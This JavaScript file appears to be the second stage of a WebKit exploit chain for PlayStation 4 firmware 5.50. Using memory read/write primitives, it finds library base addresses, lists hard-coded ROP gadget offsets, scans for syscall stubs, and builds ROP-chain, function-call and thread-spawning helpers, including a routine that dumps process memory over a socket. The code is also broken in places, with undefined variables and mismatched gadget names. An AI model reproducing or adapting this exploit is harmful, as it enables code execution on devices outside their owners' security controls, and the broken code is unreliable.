var p;
var ping = function(str) {
    "use strict";
    var xhr = new XMLHttpRequest();
    xhr.open("GET", url, false);
    xhr.send(null);
}
var findModuleBaseXHR = function(addr)
{
    var addr_ = addr.add32(0); // copy
    addr_.low &= 0xFFFFF000;
    ping("START: " + addr_);
    
    while (1) {
        var vr = p.read4(addr_.add32(0x110-4));
        ping("step" + addr_);
        addr_.sub32inplace(0x1000);
    }
}
var log = function(x) {
    document.getElementById("console").innerText += x + "\n";
}
var print = function(string) { // like log but html
    document.getElementById("console").innerHTML += string + "\n";
}

var dumpModuleXHR = function(moduleBase) {
    var chunk = new ArrayBuffer(0x1000);
    var chunk32 = new Uint32Array(chunk);
    var chunk8 = new Uint8Array(chunk);
    
    connection.binaryType = "arraybuffer";
    var helo = new Uint32Array(1);
    helo[0] = 0x41414141;
    
    var moduleBase_ = moduleBase.add32(0);
    connection.onmessage = function() {
        try {
            for (var i = 0; i < chunk32.length; i++)
            {
                var val = p.read4(moduleBase_);
                chunk32[i] = val;
                moduleBase_.add32inplace(4);
            }
            connection.send(chunk8);
        } catch (e) {
            print(e);
        }
    }
}
var deref_stub_jmp = function(addr) {
  var z = p.read4(addr) & 0xFFFF;
  var y = p.read4(addr.add32(2));

  if (z != 0x25FF) return 0;
  
  return addr.add32(y + 6);
}

var reenter_help = { length:
    { valueOf: function(){
        return 0;
    }
}};

/* For storing the gadget and import map */
window.GadgetMap_wk = [];
window.slowpath_jop = [];

/* Simply adds given offset to given module's base address */
function getGadget(moduleName, offset) {
    return add2(window.ECore.moduleBaseAddresses[moduleName], offset);
    
}
var slowpath_jop = function() {
    slowpath_jop = {'5.50': {

            'setjmp': getGadget('libSceWebKit2', 0x14F8), // setjmp imported from libkernel
            '__stack_chk_fail_ptr': getGadget('libSceWebKit2', 0x384BA40), // pointer to pointer to stack_chk_fail imported from libkernel -> look at epilogs to find this
            "sceKernelLoadStartModule": getGadget('libkernel', 0x31470), // dump libkernel using the stack_chk_fail pointer to find base, then look for _sceKernelLoadStartModule
        }
    };
}
var gadgetmap_wk = function() {
    gadgetmap_wk = {'5.50': {    
            'pop rsi': getGadget('libSceWebKit2', 0x0008f38a), // 0x000000000008f38a : pop rsi ; ret // 5ec3
            'pop rdi': getGadget('libSceWebKit2', 0x00038dba), // pop rdi ; ret
            'pop rax': getGadget('libSceWebKit2', 0x000043f5), // pop rax ; ret
            'pop rcx': getGadget('libSceWebKit2', 0x00052e59), // pop rcx ; ret
            'pop rdx': getGadget('libSceWebKit2', 0x000dedc2), // pop rdx ; ret
            'pop r8': getGadget('libSceWebKit2', 0x000179c5), // pop r8 ; ret
            'pop r9': getGadget('libSceWebKit2', 0x00bb30cf), // pop r9 ; ret
            'pop rsp': getGadget('libSceWebKit2', 0x0001e687), // pop rsp ; ret
            'push rax': getGadget('libSceWebKit2', 0x0017778e), // push rax ; ret  ;
            'mov rax, rdi': getGadget('libSceWebKit2', 0x000058d0), // mov rax, rdi ; ret
            'mov rax, rdx': getGadget('libSceWebKit2', 0x001cee60), // 0x00000000001cee60 : mov rax, rdx ; ret // 4889d0c3
            'add rax, rcx': getGadget('libSceWebKit2', 0x00015172), // add rax, rcx ; ret
            'mov qword ptr [rdi], rax': getGadget('libSceWebKit2', 0x0014536b), // mov qword ptr [rdi], rax ; ret 
            'mov qword ptr [rdi], rsi': getGadget('libSceWebKit2', 0x00023ac2), // mov qword ptr [rdi], rsi ; ret
            'mov rax, qword ptr [rax]': getGadget('libSceWebKit2', 0x0006c83a), // mov rax, qword ptr [rax] ; ret
            'ret': getGadget('libSceWebKit2', 0x0000003c), // ret  ;
            'nop': getGadget('libSceWebKit2', 0x00002f8f), // 0x0000000000002f8f : nop ; ret // 90c3

            'syscall': getGadget('libSceWebKit2', 0x2264DBC), // syscall  ; ret

            'jmp rax': getGadget('libSceWebKit2', 0x00000082), // jmp rax ;
            'jmp r8': getGadget('libSceWebKit2', 0x00201860), // jmp r8 ;
            'jmp r9': getGadget('libSceWebKit2', 0x001ce976), // jmp r9 ;
            'jmp r11': getGadget('libSceWebKit2', 0x0017e73a), // jmp r11 ;
            'jmp r15': getGadget('libSceWebKit2', 0x002f9f6d), // jmp r15 ;
            'jmp rbp': getGadget('libSceWebKit2', 0x001fb8bd), // jmp rbp ;
            'jmp rbx': getGadget('libSceWebKit2', 0x00039bd2), // jmp rbx ;
            'jmp rcx': getGadget('libSceWebKit2', 0x0000dee3), // jmp rcx ;
            'jmp rdi': getGadget('libSceWebKit2', 0x000b479c), // jmp rdi ;
            'jmp rdx': getGadget('libSceWebKit2', 0x0000e3d0), // jmp rdx ;
            'jmp rsi': getGadget('libSceWebKit2', 0x0002e004), // jmp rsi ;
            'jmp rsp': getGadget('libSceWebKit2', 0x0029e6ad), // jmp rsp ;

            // 0x013d1a00 : mov rdi, qword ptr [rdi] ; mov rax, qword ptr [rdi] ; mov rax, qword ptr [rax] ; jmp rax // 488b3f488b07488b00ffe0   
            // 0x00d65230: mov rdi, qword [rdi+0x18] ; mov rax, qword [rdi] ; mov rax, qword [rax+0x58] ; jmp rax ;  // 48 8B 7F 18 48 8B 07 48  8B 40 58 FF E0
            'jmp addr': getGadget('libSceWebKit2', 0x00d65230),
       }
    };
}
var exploit = function() {
  p=window.primitives;
  
    print ("[+] exploit succeeded");
    print("webkit exploit result: " + p.leakval(0x41414141));
    print ("--- welcome to stage2 ---");
    
    p.leakfunc = function(func)
    {
        var fptr_store = p.leakval(func);
        return (p.read8(fptr_store.add32(0x18))).add32(0x40);
    }  
    var parseFloatStore = p.leakfunc(parseFloat);
    var parseFloatPtr = p.read8(parseFloatStore);
    print("parseFloat at: 0x" + parseFloatPtr);
    
    var webKitBase = p.read8(parseFloatStore);
    window.webKitBase = webKitBase;
    webKitBase.low &= 0xfffff000;
    webKitBase.sub32inplace(0x5b7000-0x1C000);
    
    window.moduleBaseWebKit = webKitBase;

    var offsetToWebKit = function(off) {
      return window.moduleBaseWebKit.add32(off)
    }    

    print("libwebkit base at: 0x" + webKitBase);
    
    var gadget = function(o)
    {
        return webKitBase.add32(o);
    }
          gadgets = {    

  "stack_chk_fail": gadget(0xc8),
        
    };   
/*
    var libSceLibcInternalBase = p.read8(deref_stub_jmp(gadgets['stack_chk_fail']));
    libSceLibcInternalBase.low &= ~0x3FFF;
    libSceLibcInternalBase.sub32inplace(0x20000);
    print("libSceLibcInternal: 0x" + libSceLibcInternalBase.toString());
    window.libSceLibcInternalBase = libSceLibcInternalBase;
*/  
    var libKernelBase = p.read8(deref_stub_jmp(window.gadgets['stack_chk_fail']));
    window.libKernelBase = libKernelBase;
    libKernelBase.low &= 0xfffff000;
    libKernelBase.sub32inplace(0x12000);
    
    window.moduleBaseLibKernel = libKernelBase;

    var offsetToLibKernel = function(off) {
      return window.moduleBaseLibKernel.add32(off);
    }
    // Get libc module address
    var libSceLibcBase = p.read8(deref_stub_jmp(offsetToWebKit(0x228)));
    libSceLibcBase.low &= 0xfffff000;

    window.moduleBaseLibc = libSceLibcBase;
    
    var offsetToLibc = function(off) {
      return window.moduleBaseLibc.add32(off);
    }

    
    print("libkernel_web base at: 0x" + libKernelBase);
    
        var o2lk = function(o)
    {
        return libKernelBase.add32(o);
    }
    window.o2lk = o2lk;
    
    var wkview = new Uint8Array(0x1000);
    var wkstr = p.leakval(wkview).add32(0x10);
    var orig_wkview_buf = p.read8(wkstr);
    
    p.write8(wkstr, webKitBase);
    p.write4(wkstr.add32(8), 0x367c000);
    
    var gadgets_to_find = 0;
    var gadgetnames = [];
    for (var gadgetname in gadgetmap_wk) {
        if (gadgetmap_wk.hasOwnProperty(gadgetname)) {
            gadgets_to_find++;
            gadgetnames.push(gadgetname);
            gadgetmap_wk[gadgetname].reverse();
        }
    }
    log("finding gadgets");
    
    gadgets_to_find++; // slowpath_jop
    var findgadget = function(donecb) {
        if (gadgets)
        {
            gadgets_to_find=0;
            slowpath_jop=0;
            log("using gadgets");
            
            for (var gadgetname in gadgets) {
                if (gadgets.hasOwnProperty(gadgetname)) {
                    gadgets[gadgetname] = gadget(gadgets[gadgetname]);
                }
            }
            
        } else {
            for (var i=0; i < wkview.length; i++)
            {
                if (wkview[i] == 0xc3)
                {
                    for (var nl=0; nl < gadgetnames.length; nl++)
                    {
                        var found = 1;
                        if (!gadgetnames[nl]) continue;
                        var gadgetbytes = gadgetmap_wk[gadgetnames[nl]];
                        for (var compareidx = 0; compareidx < gadgetbytes.length; compareidx++)
                        {
                            if (gadgetbytes[compareidx] != wkview[i - compareidx]){
                                found = 0;
                                break;
                            }
                        }
                        if (!found) continue;
                        gadgets[gadgetnames[nl]] = gadget(i - gadgetbytes.length + 1);
                        
                        delete gadgetnames[nl];
                        gadgets_to_find--;
                    }
                } else if (wkview[i] == 0xe0 && wkview[i-1] == 0xff && slowpath_jop)
                {
                    var found = 1;
                    for (var compareidx = 0;compareidx < slowpath_jop.length; compareidx++)
                    {
                        if (slowpath_jop[compareidx] != wkview[i - compareidx])
                        {
                            found = 0;
                            break;
                        }
                    }
                    if (!found) continue;
                    gadgets["jop"] = gadget(i - slowpath_jop.length + 1);
                    gadgetoffs["jop"] = i - slowpath_jop.length + 1;
                    gadgets_to_find--;
                    slowpath_jop = 0;
                }
                
                if (!gadgets_to_find) break;
            }
        }
        if (!gadgets_to_find && !slowpath_jop) {
            log("found gadgets");
            if (gadgets)
                gadgets.open = function(e){
                    gadgets.send(JSON.stringify(slowpath_jop));
                }
                setTimeout(donecb, 50);
        } else {
            log("missing gadgets: ");
            for (var nl in gadgetnames) {
                log(" - " + gadgetnames[nl]);
            }
            if(slowpath_jop) log(" - jop gadget");
        }
    }

  // Setup ROP launching
    findgadget(function(){});
    var hold1;
    var hold2;
    var holdz;
    var holdz1;

    while (1) {
      hold1 = {a:0, b:0, c:0, d:0};
      hold2 = {a:0, b:0, c:0, d:0};
      holdz1 = p.leakval(hold2);
      holdz = p.leakval(hold1);
      if (holdz.low - 0x30 == holdz1.low) break;
    }

    var pushframe = [];
    pushframe.length = 0x80;
    var funcbuf;

   
     // Write to address with value (helper function)
  this.write64 = function (addr, val) {
    this.push(window.gadgets["pop rdi"]);
    this.push(addr);
    this.push(window.gadgets["pop rax"]);
    this.push(val);
    this.push(window.gadgets["mov [rdi], rax"]);
  }
   
    window.Rop = function () {
        this.stack = new Uint32Array(0x10000);
        this.stackPointer = p.read8(p.leakval(this.stack).add32(0x10));
        this.count = 0;
        
        this.clear = function() {
            this.count = 0;
            this.runtime = undefined;
            
            for (var i = 0; i < 0x1000/8; i++)
            {
                p.write8(this.stackBase.add32(i*8), 0);
            }
        };
        
        this.pushSymbolic = function() {
            this.count++;
            return this.count-1;
        }
        
        this.finalizeSymbolic = function(idx, val) {
            p.write8(this.stackBase.add32(idx*8), val);
        }
        
        this.push = function(val) {
            this.finalizeSymbolic(this.pushSymbolic(), val);
        }
         this.push_write8 = function(where, what)
  {
      this.push(gadgets["pop rdi"]); // pop rdi
      this.push(where); // where
      this.push(gadgets["pop rsi"]); // pop rsi
      this.push(what); // what
      this.push(gadgets["mov [rdi], rsi"]); // perform write
  }
       this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9)
  {
    if (rdi != undefined) {
      this.push(gadgets["pop rdi"]); // pop rdi
      this.push(rdi); // what
    }
    if (rsi != undefined) {
      this.push(gadgets["pop rsi"]); // pop rsi
      this.push(rsi); // what
    }
    if (rdx != undefined) {
      this.push(gadgets["pop rdx"]); // pop rdx
      this.push(rdx); // what
    }
    if (rcx != undefined) {
      this.push(gadgets["pop rcx"]); // pop r10
      this.push(rcx); // what
    }
    if (r8 != undefined) {
      this.push(gadgets["pop r8"]); // pop r8
      this.push(r8); // what
    }
    if (r9 != undefined) {
      this.push(gadgets["pop r9"]); // pop r9
      this.push(r9); // what*/
    }

    this.push(rip); // jmp
    return this;
  }
        
      this.run = function() {
      var retv = p.loadchain(this, this.notimes);
      this.clear();
      return retv;
  }
  
  return this;
};
    var RopChain = window.Rop();
 
    log("--- welcome to all stage ---");
    print("stage2");
    print("loaded gadgets.all good. gadgets test = Successful");
    
    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(0x10);
    var orig_kview_buf = p.read8(kstr);
    
    p.write8(kstr, window.libKernelBase);
    p.write4(kstr.add32(8), 0x40000); // high enough lel
    
    var countbytes;
    for (var i=0; i < 0x40000; i++)
    {
        if (kview[i] == 0x72 && kview[i+1] == 0x64 && kview[i+2] == 0x6c && kview[i+3] == 0x6f && kview[i+4] == 0x63)
        {
            countbytes = i;
            break;
        }
    }    

    p.write4(kstr.add32(8), countbytes + 32);
    
    var dview32 = new Uint32Array(1);
    var dview8 = new Uint8Array(dview32.buffer);
    for (var i=0; i < countbytes; i++)
    {
        if (kview[i] == 0x48 && kview[i+1] == 0xc7 && kview[i+2] == 0xc0 && kview[i+7] == 0x49 && kview[i+8] == 0x89 && kview[i+9] == 0xca && kview[i+10] == 0x0f && kview[i+11] == 0x05)
        {
            dview8[0] = kview[i+3];
            dview8[1] = kview[i+4];
            dview8[2] = kview[i+5];
            dview8[3] = kview[i+6];
            var syscallno = dview32[0];
            window.syscalls[syscallno] = window.libKernelBase.add32(i);
        }
    }
       // Setup helpful primitives for calling and string operations
       var chain = new window.Rop;
    
    p.fcall = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
        chain.clear();
        
        chain.notimes = this.next_notime;
        this.next_notime = 1;
        
        chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
        
        chain.push(window.gadgets["pop rdi"]); // pop rdi
        chain.push(chain.stackPointer.add32(0x3ff8)); // where
        chain.push(window.gadgets["mov [rdi], rax"]); // rdi = rax
        
        chain.push(window.gadgets["pop rax"]); // pop rax
        chain.push(p.leakval(0x41414242)); // where
        
        if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
        returnvalue = p.read8(chain.stackPointer.add32(0x3ff8)); //p.read8(chain.stackPointer.add32(0x3ff8));
    }
     p.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9)
    {
        if (typeof sysc == "string") {
            sysc = window.syscallnames[sysc];
        }
        if (typeof sysc != "number") {
            throw new Error("invalid syscall");
        }
        
        var off = window.syscalls[sysc];
        if (off == undefined)
        {
            throw new Error("invalid syscall");
        }
        
        return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
    }    
     
      var spawnthread = function (chain) {
      var longjmp       = offsetToWebKit(0x1458);
      var createThread  = offsetToWebKit(0x116ED40);

      var contextp = mallocu32(0x2000);
      var contextz = contextp.backing;
      contextz[0] = 1337;
      p.syscall(324, 1);
  
      var thread2 = new window.rop();

      thread2.clear();
      thread2.push(window.gadgets["ret"]); // nop
      thread2.push(window.gadgets["ret"]); // nop
      thread2.push(window.gadgets["ret"]); // nop

      thread2.push(window.gadgets["ret"]); // nop
      chain(thread2);

      p.write8(contextp, window.gadgets["ret"]); // rip -> ret gadget
      p.write8(contextp.add32(0x10), thread2.stackBase); // rsp

      var test = p.fcall(createThread, longjmp, contextp, stringify("GottaGoFast"));

      window.nogc.push(contextz);
      window.nogc.push(thread2);
      
      return thread2;
      }

 
log("stage3");
    print("loaded syscalls.all good. fcall test = Successful");  
    print("all stages test");
    print("NOT FULL Exploit 5.5x");
    
    /*sc = document.createElement("script");
    sc.src="kernel.js";
    document.body.appendChild(sc);}, 100);*/
}

